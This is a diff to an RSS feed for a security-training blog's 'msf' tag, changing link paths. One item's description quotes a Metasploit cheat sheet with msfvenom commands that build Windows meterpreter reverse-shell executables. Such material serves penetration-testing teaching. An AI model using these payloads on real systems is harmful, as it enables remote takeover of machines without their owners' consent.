@@ -2,22 +2,22 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>msf on ClassRoom</title>
-    <link>/tags/msf/</link>
+    <link>/class/tags/msf/</link>
     <description>Recent content in msf on ClassRoom</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>anir0y</copyright>
     <lastBuildDate>Mon, 01 Jul 2019 18:33:42 +0530</lastBuildDate>
     
-	<atom:link href="/tags/msf/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/class/tags/msf/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Cheatsheet Msfpaylods</title>
-      <link>/blog/cheatsheet-msfpaylods/</link>
+      <link>/class/blog/cheatsheet-msfpaylods/</link>
       <pubDate>Mon, 01 Jul 2019 18:33:42 +0530</pubDate>
       
-      <guid>/blog/cheatsheet-msfpaylods/</guid>
+      <guid>/class/blog/cheatsheet-msfpaylods/</guid>
       <description>Most Common Payloads Binaries    Command Info     msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.exe Creates a simple TCP Payload for Windows   msfvenom -p windows/meterpreter/reverse_http LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.</description>
     </item>
     
